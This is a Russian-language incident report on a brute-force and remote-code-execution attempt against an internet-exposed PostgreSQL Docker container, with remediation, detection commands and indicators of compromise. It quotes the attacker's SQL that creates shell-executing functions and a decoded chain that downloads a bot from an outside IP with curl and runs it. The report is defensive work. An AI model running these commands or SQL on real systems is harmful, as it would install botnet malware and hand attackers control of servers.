# 🚨 КРИТИЧЕСКАЯ УГРОЗА БЕЗОПАСНОСТИ - ОТЧЁТ

## ⚠️ ОБНАРУЖЕНА АТАКА

**Дата:** 23 января 2026, 11:40-11:51 UTC  
**Источник:** Внешние IP-адреса  
**Цель:** PostgreSQL на порту 5433

---

## 🎯 ЧТО ПРОИЗОШЛО

### 1. Брутфорс пароля (Password Brute Force)

```
FATAL: password authentication failed for user "postgres"
Каждую минуту с 11:40 до 11:51 UTC
```

Автоматизированная атака пытается подобрать пароль к учётной записи `postgres`.

### 2. Попытка выполнения вредоносного кода

```sql
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6'
CREATE FUNCTION run_shell_command(cmd TEXT) RETURNS void AS $$ import subprocess ...
```

**Расшифровка base64 из логов:**

```bash
# Скрипт пытался:
1. Скачать бот: curl http://185.186.25.120/bot > /tmp/bot
2. Сделать исполняемым: chmod +x /tmp/bot
3. Запустить: /tmp/bot database1
4. Убить процессы антивирусов и мониторинга
```

**IP атакующего:** `185.186.25.120` (известный ботнет-сервер)

### 3. Почему атака НЕ УДАЛАСЬ (пока):

- ✅ Расширение `plpython3u` не установлено
- ✅ Файл `/lib/x86_64-linux-gnu/libc.so.6` недоступен (Alpine Linux использует musl, не glibc)
- ✅ Пароль `postgres` оказался неверным (если вы его меняли)

**НО:** Атаки продолжаются каждую минуту!

---

## 🛡️ СРОЧНЫЕ МЕРЫ (УЖЕ ПРИМЕНЕНЫ)

### 1. ✅ Закрыт внешний доступ к PostgreSQL

```yaml
# Было:
ports:
  - '5433:5432' # ОПАСНО! Открыт для всего интернета

# Стало:
expose:
  - '5432' # Доступ только внутри Docker сети
```

### 2. ✅ Изменён пароль по умолчанию

```yaml
# Было:
POSTGRES_PASSWORD=postgres  # Слабый пароль

# Стало:
POSTGRES_PASSWORD=SuperSecurePassword2026!ChangeMe  # Сильный пароль
```

---

## 🔥 ЧТО НУЖНО СДЕЛАТЬ ПРЯМО СЕЙЧАС

### Шаг 1: Остановить текущие контейнеры

```bash
docker compose down -v
```

### Шаг 2: Настроить файрвол на сервере

```bash
# Для Ubuntu/Debian
sudo ufw enable
sudo ufw default deny incoming
sudo ufw allow 22/tcp    # SSH
sudo ufw allow 80/tcp    # HTTP
sudo ufw allow 443/tcp   # HTTPS
sudo ufw allow 3000/tcp  # API (если нужен внешний доступ)
# НЕ открывайте 5432 или 5433!

# Проверить правила
sudo ufw status verbose
```

### Шаг 3: Запустить с новыми настройками

```bash
docker compose up -d --build
```

### Шаг 4: Проверить, что порт закрыт

```bash
# С внешнего сервера попробуйте:
nc -zv YOUR_SERVER_IP 5433
# Должно быть: Connection refused

# Локально проверить:
docker compose ps
# БД должна быть доступна только внутри Docker сети
```

---

## 🔍 ДИАГНОСТИКА ВЗЛОМА

### Проверить, не заражена ли система

```bash
# Проверить запущенные процессы
ps aux | grep -E "bot|watchdog|kinsing|xmrig"

# Проверить подозрительные файлы
ls -la /tmp/
ls -la /var/tmp/
find /tmp -name "bot" -o -name ".watchdog" -o -name "httpd"

# Проверить сетевые соединения
netstat -antp | grep ESTABLISHED
ss -antp | grep ESTABLISHED

# Проверить cron задания
crontab -l
sudo crontab -l

# Проверить Docker контейнеры
docker ps -a
docker logs meract-rest-api-db-1 | grep -E "CREATE FUNCTION|system|plpython"
```

### Если найдены вредоносные файлы

```bash
# Удалить бот
sudo rm -f /tmp/bot /tmp/.bot /tmp/watchdog
sudo pkill -9 -f bot
sudo pkill -9 -f watchdog

# Очистить PostgreSQL от вредоносных функций (если были созданы)
docker compose exec db psql -U postgres -d Meract -c "DROP FUNCTION IF EXISTS system(cstring);"
docker compose exec db psql -U postgres -d Meract -c "DROP FUNCTION IF EXISTS run_shell_command(text);"
```

---

## 📊 АНАЛИЗ АТАКИ

### IP атакующего

- **IP:** 185.186.25.120
- **Местоположение:** Вероятно, ботнет-сервер
- **Действия:**
  - Сканирование открытых портов PostgreSQL
  - Брутфорс паролей
  - Попытка RCE (Remote Code Execution)
  - Установка крипто-майнера

### Индикаторы компрометации (IoCs)

```
URL: http://185.186.25.120/bot
Процессы: bot, watchdog, kinsing, xmrig, pg_mem
Файлы: /tmp/bot, /tmp/.watchdog, /tmp/httpd
```

### Добавить в fail2ban (рекомендуется)

```bash
# /etc/fail2ban/filter.d/postgresql.conf
[Definition]
failregex = FATAL:  password authentication failed for user
ignoreregex =

# /etc/fail2ban/jail.local
[postgresql]
enabled  = true
port     = postgresql
filter   = postgresql
logpath  = /var/log/postgresql/*.log
maxretry = 3
bantime  = 86400  # 24 часа
```

---

## 🔐 ДОЛГОСРОЧНЫЕ МЕРЫ БЕЗОПАСНОСТИ

### 1. Используйте .env файл для паролей

```bash
# Создайте .env файл (НЕ коммитьте в Git!)
cat > .env << EOF
POSTGRES_USER=postgres
POSTGRES_PASSWORD=$(openssl rand -base64 32)
POSTGRES_DB=Meract
DATABASE_URL=postgresql://\${POSTGRES_USER}:\${POSTGRES_PASSWORD}@db:5432/\${POSTGRES_DB}?schema=public
EOF

# Добавьте в .gitignore
echo ".env" >> .gitignore
```

### 2. Настройте pg_hba.conf (ограничение подключений)

```bash
# Создайте файл pg_hba.conf
cat > pg_hba.conf << 'EOF'
# TYPE  DATABASE        USER            ADDRESS                 METHOD
local   all             all                                     trust
host    all             all             127.0.0.1/32            md5
host    all             all             ::1/128                 md5
host    all             all             172.0.0.0/8             md5
host    all             all             10.0.0.0/8              md5
# Блокируем всё остальное
host    all             all             0.0.0.0/0               reject
EOF

# Добавьте в docker-compose.yml
volumes:
  - ./pg_hba.conf:/etc/postgresql/pg_hba.conf:ro
```

### 3. Включите SSL для PostgreSQL

```yaml
db:
  command: >
    postgres
    -c ssl=on
    -c ssl_cert_file=/etc/ssl/certs/server.crt
    -c ssl_key_file=/etc/ssl/private/server.key
```

### 4. Регулярный мониторинг

```bash
# Установите мониторинг логов
sudo apt install logwatch
sudo logwatch --detail High --service postgresql --range today

# Или настройте алерты через Prometheus/Grafana
```

### 5. Обновления безопасности

```bash
# Регулярно обновляйте образы
docker compose pull
docker compose up -d

# Обновляйте хост-систему
sudo apt update && sudo apt upgrade -y
```

---

## ✅ ЧЕКЛИСТ ПРОВЕРКИ БЕЗОПАСНОСТИ

- [x] Закрыт порт 5433 от внешнего доступа
- [x] Изменён пароль PostgreSQL
- [ ] Настроен файрвол (ufw/iptables)
- [ ] Проверена система на вредоносное ПО
- [ ] Удалены подозрительные файлы из /tmp
- [ ] Настроен fail2ban для PostgreSQL
- [ ] Создан .env файл с секретами
- [ ] Добавлен .env в .gitignore
- [ ] Настроен pg_hba.conf
- [ ] Включен мониторинг логов
- [ ] Запланированы регулярные обновления

---

## 📞 ДОПОЛНИТЕЛЬНЫЕ РЕСУРСЫ

- [CERT отчёт о ботнете Kinsing](https://www.crowdstrike.com/blog/kinsing-malware-targeting-container-environments/)
- [PostgreSQL Security Checklist](https://www.postgresql.org/docs/current/auth-pg-hba-conf.html)
- [Docker Security Best Practices](https://docs.docker.com/engine/security/)

---

## 🎯 ИТОГ

**КРИТИЧНОСТЬ:** 🔴 ВЫСОКАЯ  
**СТАТУС:** ⚠️ Атака заблокирована, но угроза сохраняется  
**ДЕЙСТВИЯ:** Немедленно перезапустите контейнеры с новыми настройками и настройте файрвол

**Не игнорируйте эту угрозу!** Атакующие вернутся с новыми методами.
